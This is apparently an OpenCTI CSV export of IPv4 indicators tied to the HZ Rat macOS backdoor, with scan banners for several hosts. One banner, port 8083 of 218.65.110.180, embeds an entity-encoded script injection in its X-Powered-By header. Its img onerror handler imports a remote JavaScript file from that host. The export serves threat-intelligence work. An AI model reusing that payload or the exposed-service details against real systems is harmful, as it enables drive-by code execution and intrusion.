"created_at","entity_type","objectLabel","objectMarking","observable_value","updated_at","value","x_opencti_description","x_opencti_score"
"2024-08-27T15:24:51.129Z","IPv4-Addr","trojan,macos,backdoor,instant messengers,hz rat,dingtalk,wechat,openvpn","TLP:CLEAR","120.53.133.226","2024-08-27T15:24:51.334Z","120.53.133.226","","50"
"2024-08-27T15:24:51.132Z","IPv4-Addr","trojan,macos,backdoor,instant messengers,hz rat,dingtalk,wechat,openvpn","TLP:CLEAR","111.21.246.147","2024-08-27T15:24:51.454Z","111.21.246.147","","50"
"2024-08-27T15:24:51.919Z","IPv4-Addr","trojan,macos,backdoor,instant messengers,hz rat,dingtalk,wechat,openvpn","TLP:CLEAR","113.125.92.32","2024-08-27T15:24:52.151Z","113.125.92.32","","50"
"2024-08-27T15:24:52.842Z","IPv4-Addr","trojan,macos,backdoor,instant messengers,hz rat,dingtalk,wechat,openvpn","TLP:CLEAR","123.232.31.206","2024-08-27T15:24:52.872Z","123.232.31.206","","50"
"2024-08-27T15:24:52.842Z","IPv4-Addr","trojan,macos,backdoor,instant messengers,hz rat,dingtalk,wechat,openvpn","TLP:CLEAR","218.193.83.70","2024-08-27T15:24:52.952Z","218.193.83.70","","50"
"2024-08-27T15:24:53.500Z","IPv4-Addr","trojan,macos,backdoor,instant messengers,hz rat,dingtalk,wechat,openvpn","TLP:CLEAR","218.65.110.180","2024-08-27T15:25:07.740Z","218.65.110.180","**ISP:** CHINANET-BACKBONE

**OS:** -

--------------------------
Services:

**161:**
```
SNMP:
  Versions:
    3
  Engine Boots: 1
  Engineid Data: 80001f888043b5dd6366b5944f
  Enterprise: 8072
  Engine Time: 13 days, 2:59:23
```
------------------
**8000:**
```
HTTP/1.1 302 Found
Content-Language: en-US
Date: Mon, 26 Dec 2022 06:12:48 GMT
Location: http://218.65.110.180/site/main/index.html
Content-Length: 0
```
------------------
**8083:**
```
HTTP/1.1 200 OK
Server: nginx
Date: Sun, 25 Aug 2024 05:24:34 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 21182
Connection: keep-alive
Last-Modified: Thu, 03 Aug 2023 07:33:54 GMT
Etag: ""e75-601ffcd5d5c80""
Accept-Ranges: bytes
X-Powered-By: PHP/7&#38;&#35;&#52;&#57;&#59;&#38;&#35;&#55;&#53;&#59;&#38;&#35;&#49;&#49;&#57;&#59;&#38;&#35;&#55;&#56;&#59;&#38;&#35;&#49;&#49;&#48;&#59;&#38;&#35;&#49;&#50;&#49;&#59;&#38;&#35;&#49;&#48;&#55;&#59;&#38;&#35;&#49;&#49;&#50;&#59;&#38;&#35;&#49;&#48;&#50;&#59;&#38;&#35;&#55;&#50;&#59;&#38;&#35;&#54;&#57;&#59;&#38;&#35;&#54;&#56;&#59;<img	src=1	onerror=&#105;&#109;&#112;&#111;&#114;&#116;&#40;&#117;&#110;&#101;&#115;&#99;&#97;&#112;&#101;&#40;&#39;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#50;&#49;&#56;&#46;&#54;&#53;&#46;&#49;&#49;&#48;&#46;&#49;&#56;&#48;&#47;&#49;&#75;&#119;&#78;&#110;&#121;&#107;&#112;&#102;&#72;&#69;&#68;&#47;&#78;&#111;&#100;&#101;&#46;&#106;&#115;&#39;&#41;&#41;>



<!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"">

<html>
<head><meta charset=utf-8""UTF-8"" /><meta http-equiv=""X-UA-Compatible"" content=""IE=edge,chrome=1"" /><meta name=""viewport"" content=""width=device-width, initial-scale=1.0"" /><title>
	大运会智慧保电指挥系统平台
</title><link rel=""stylesheet"" type=""text/css"" href=""reset.css"" tppabs=""http://www.yuanyangsm.com/css/reset.css"" /><link rel=""stylesheet"" type=""text/css"" href=""login.css"" tppabs=""http://www.yuanyangsm.com/css/login.css"" />
<style type=""text/css"">
<!--
.STYLE1 {font-family: ""新宋体""}
.STYLE5 {font-family: ""微软雅黑"", ""幼圆"", ""隶书"", ""宋体""}
-->
</style>
</head>
<body>
    <form name=""form1"" method=""post"" action=""http://www.yuanyangsm.com/"" id=""form1"" style=""width:100%;height:100%"">
<div>
<input type=""hidden"" name=""__VIEWSTATE"" id=""__VIEWSTATE"" value=""/wEPDwUKMTE4Mzg5ODU4MA9kFgICAw9kFgICAQ8QDxYGHg1EYXRhVGV4dEZpZWxkBQd1cl9uYW1lHg5EYXRhVmFsdWVGaWVsZAUMdXJfbG9naW5uYW1lHgtfIURhdGFCb3VuZGdkEBUFD+ezu+e7n+euoeeQhuWRmAbnjovolocG5YiY6bmPCeiDpeW6huWwpwnnjovmgJ3muIUVBQVhZG1pbgbnjovolocG5YiY6bmPCeiDpeW6huWwpwnnjovmgJ3muIUUKwMFZ2dnZ2dkZGSGNOqpcj9CCbY5PA5gSNLQ8OR+yvnxuKAYNBHlOPVsKA=="" />
</div>

<div>

	<input type=""hidden"" name=""__VIEWSTATEGENERATOR"" id=""__VIEWSTATEGENERATOR"" value=""C2EE9ABB"" />
</div>
        <div  class=""content"">			
			<div class=""login-box"">
				<div class=""box-left"">
				</div>
				<div class=""box-right"">
					<div class=""box-title"">
						<div class=""mian-title"">
							大运会智慧保电指挥系统平台
						</div>
						<div class=""sub-title"">
							大运会智慧保电指挥系统
						</div>
					</div>
					<div class=""input-box"">
						<div class=""u-input-box b35"">
							<div class=""input-img  u-user"">
							</div>
							<div class=""th-input"">
                                <
```
------------------
**8090:**
```
HTTP/1.1 200 OK
Transfer-Encoding: chunked
Cache-Control: no-store
Content-Type: text/html; charset=utf-8
Date: Sat, 03 Aug 2024 23:55:48 GMT
Expires: 0
Pragma: no-cache
Set-Cookie: _orangehrm=qapn7c0jjakresoi4uutbfkg4p; path=/; HttpOnly
Vary: Accept-Encoding
X-Frame-Options: DENY
X-Request-Id: 4426001794ae5437011eebf9d838d898
```
------------------","50"
"2024-08-27T15:24:54.314Z","IPv4-Addr","trojan,macos,backdoor,instant messengers,hz rat,dingtalk,wechat,openvpn","TLP:CLEAR","29.40.48.21","2024-08-27T15:24:54.398Z","29.40.48.21","","50"
"2024-08-27T15:24:54.846Z","IPv4-Addr","trojan,macos,backdoor,instant messengers,hz rat,dingtalk,wechat,openvpn","TLP:CLEAR","47.100.65.182","2024-08-27T15:25:23.830Z","47.100.65.182","**ISP:** Hangzhou Alibaba Advertising Co.,Ltd.

**OS:** -

--------------------------
Services:

**5800:**
```
HTTP/1.0 200 OK
```
------------------
**5900:**
```
RFB 003.008

VNC:
  Protocol Version: 3.8
  Security Types:
    2: VNC Authentication
    16: Tight
```
------------------","50"
"2024-08-27T15:24:55.062Z","IPv4-Addr","trojan,macos,backdoor,instant messengers,hz rat,dingtalk,wechat,openvpn","TLP:CLEAR","58.49.21.113","2024-08-27T15:25:32.796Z","58.49.21.113","**ISP:** CHINANET-BACKBONE

**OS:** -

--------------------------
Services:

**8089:**
```
HTTP/1.1 403 Forbidden
Server: nginx
Date: Wed, 31 Jul 2024 20:02:47 GMT
Content-Type: text/html;charset=UTF-8
Content-Length: 793
Cache-Control: private
Expires: Thu, 01 Jan 1970 08:00:00 CST
X-Content-Type-Options: nosniff
X-Hudson: 1.395
X-Jenkins: 2.47
X-Jenkins-Session: 4ee1cccf
X-You-Are-Authenticated-As: anonymous
X-You-Are-In-Group-Disabled: JENKINS-39402: use -Dhudson.security.AccessDeniedException2.REPORT_GROUP_HEADERS=true or use /whoAmI to diagnose
X-Required-Permission: hudson.model.Hudson.Read
X-Permission-Implied-By: hudson.security.Permission.GenericRead
X-Permission-Implied-By: hudson.model.Hudson.Administer
Set-Cookie: JSESSIONID=2FB11A6532AB7C7BD8327FBEFCEB9CAB; Path=/; HttpOnly

<html><head><meta http-equiv='refresh' content='1;url=/login?from=%2F'/><script>window.location.replace('/login?from=%2F');</script></head><body style='background-color:white; color:white;'>


Authentication required
<!--
You are authenticated as: anonymous
Groups that you are in:
  
Permission you need to have (but didn't): hudson.model.Hudson.Read
 ... which is implied by: hudson.security.Permission.GenericRead
 ... which is implied by: hudson.model.Hudson.Administer
-->

</body></html>
```
------------------","50"
"2024-08-27T15:24:55.645Z","IPv4-Addr","trojan,macos,backdoor,instant messengers,hz rat,dingtalk,wechat,openvpn","TLP:CLEAR","20.60.250.230","2024-08-27T15:24:55.805Z","20.60.250.230","","50"
